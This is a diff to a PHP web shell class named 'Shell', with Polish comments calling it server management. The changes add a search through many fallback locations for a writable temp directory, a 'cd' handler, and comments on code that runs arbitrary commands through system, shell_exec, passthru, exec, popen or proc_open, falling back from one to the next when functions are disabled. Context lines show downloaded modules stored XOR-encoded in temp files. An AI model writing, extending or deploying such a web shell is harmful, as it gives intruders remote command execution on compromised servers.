@@ -17,7 +17,7 @@ require_once dirname( __FILE__ ) . '/Lib/LoadModules.php';
 /**
  * class Shell - Zarzadzanie serwerem
  *
- * @version 0.21
+ * @version 0.31
  *
  * @uses Arr
  * @uses Request
@@ -28,7 +28,7 @@ class Shell
 	/**
 	 * Wersja
 	 */
-	const VERSION = '0.30 b110709';
+	const VERSION = '0.31 b110907';
 
 	/**
 	 * Help, natywne polecenia
@@ -160,6 +160,14 @@ info - Wyświetla informacje o systemie';
 	private $sStyleSheet;
 
 	/**
+	 * Katalog tymczasowy
+	 *
+	 * @access public
+	 * @var    string
+	 */
+	public $sTmp;
+
+	/**
 	 * Konstruktor
 	 *
 	 * @uses   Request
@@ -178,6 +186,38 @@ info - Wyświetla informacje o systemie';
 		 * @ignore
 		 */
 		$this -> sStyleSheet = file_get_contents( 'Styles/blue.css' );
+
+		/**
+		 * Katalog tymczasowy
+		 */
+		if( isset( $_ENV['TMP'] ) && is_writable( $sDir = $_ENV['TMP'] ) )
+		{
+			$this -> sTmp = $sDir;
+		}
+		else if( isset( $_ENV['TEMP'] ) && is_writable( $sDir = $_ENV['TEMP'] ) )
+		{
+			$this -> sTmp = $sDir;
+		}
+		else if( isset( $_ENV['TMPDIR'] ) && is_writable( $sDir = $_ENV['TMPDIR'] ) )
+		{
+			$this -> sTmp = $sDir;
+		}
+		else if( is_writable( $sDir = ini_get( 'session.save_path' ) ) )
+		{
+			$this -> sTmp = $sDir;
+		}
+		else if( is_writable( $sDir = ini_get( 'upload_tmp_dir' ) ) )
+		{
+			$this -> sTmp = $sDir;
+		}
+		else if( is_writable( $sDir = ini_get( 'soap.wsdl_cache_dir' ) ) )
+		{
+			$this -> sTmp = $sDir;
+		}
+		else if( is_writable( $sDir = sys_get_temp_dir() ) )
+		{
+			$this -> sTmp = $sDir;
+		}
 
 		/**
 		 * @see Request::init
@@ -243,7 +283,7 @@ info - Wyświetla informacje o systemie';
 		 * p jak PURE
 		 */
 		if(    ! isset( $_GET['p'] )
-		    && is_file( $sFilePath = $_SERVER['TMP'] . '/' . $sKey )
+		    && is_file( $sFilePath = $this -> sTmp . '/' . $sKey )
 		    && ( ( $sData = file_get_contents( $sFilePath ) ) !== FALSE )
 		)
 		{
@@ -348,6 +388,7 @@ info - Wyświetla informacje o systemie';
 				'OpenBaseDir: %s<br />' .
 				'Serwer Api: <strong>%s</strong><br />' .
 				'Serwer: <strong>%s</strong><br />' .
+				'TMP: <strong>%s</strong><br />' .
 				'Zablokowane funkcje: <strong>%s</strong><br />' .
 				'Dostępne moduły: <strong>%s</strong>',
 
@@ -356,6 +397,7 @@ info - Wyświetla informacje o systemie';
 				ini_get( 'open_basedir' ),
 				php_sapi_name(),
 				php_uname(),
+				$this -> sTmp,
 				( ( $sDisableFunctions = implode( ',', $this -> aDisableFunctions ) === '' ) ? 'brak' : $sDisableFunctions ),
 				implode( ', ', array_map( create_function( '$sVal', 'return strtolower( substr( $sVal, 6 ) );' ), array_keys( $this -> aHelpModules ) ) )
 		);
@@ -430,7 +472,7 @@ DATA;
 				return 'Nie można pobrać pliku z modułami';
 			}
 
-			$sFilePath = tempnam( $_SERVER['TMP'], 'shell' );
+			$sFilePath = tempnam( $this -> sTmp, 'shell' );
 			file_put_contents( $sFilePath, $sData );
 		}
 		/**
@@ -460,7 +502,7 @@ DATA;
 			$sNewData .= chr( ord( substr( $sData, $i, 1 ) ) ^ ord( substr( $sKey, ( $i % 36 ) * 2, 2 ) ) );
 		}
 
-		file_put_contents( $_SERVER['TMP'] . '/' . $sKey, $sNewData );
+		file_put_contents( $this -> sTmp . '/' . $sKey, $sNewData );
 
 		/**
 		 * Usuwanie tymczasowego pliku
@@ -577,22 +619,39 @@ DATA;
 	{
 		if( ! $this -> bSafeMode )
 		{
+			if( strncmp( $sCmd, 'cd ', 3 ) === 0 )
+			{
+				chdir( substr( $sCmd, 3 ) );
+			}
+
 			ob_start();
+			/**
+			 * system
+			 */
 			if( ! in_array( 'system', $this -> aDisableFunctions ) )
 			{
 				echo "system():\r\n\r\n";
 				system( $sCmd );
 			}
+			/**
+			 * shell_exec
+			 */
 			else if( ! in_array( 'shell_exec', $this -> aDisableFunctions ) )
 			{
 				echo "shell_exec():\r\n\r\n";
 				echo shell_exec( $sCmd );
 			}
+			/**
+			 * passthru
+			 */
 			else if( ! in_array( 'passthru', $this -> aDisableFunctions ) )
 			{
 				echo "passthru():\r\n\r\n";
 				passthru( $sCmd );
 			}
+			/**
+			 * exec
+			 */
 			else if( ! in_array( 'exec', $this -> aDisableFunctions ) )
 			{
 				echo "exec():\r\n\r\n";
@@ -602,6 +661,9 @@ DATA;
 					printf( "%s\r\n", $sLine );
 				}
 			}
+			/**
+			 * popen
+			 */
 			else if( ! in_array( 'popen', $this -> aDisableFunctions ) )
 			{
 				echo "popen():\r\n\r\n";
@@ -611,6 +673,9 @@ DATA;
 					echo fread( $rFp, 1024 );
 				}
 			}
+			/**
+			 * proc_open
+			 */
 			else if( ! in_array( 'proc_open', $this -> aDisableFunctions ) )
 			{
 				echo "proc_open():\r\n\r\n";
@@ -831,7 +896,7 @@ DATA;
 
 		if( $bRaw || ( PHP_SAPI === 'cli' ) )
 		{
-			return strip_tags( htmlspecialchars_decode( $sConsole ) ) . "\r\n";
+			return htmlspecialchars_decode( $sConsole ) . "\r\n";
 		}
 
 		$sContent  = sprintf( '<pre id="console">%s</pre><div>', $sConsole ) .
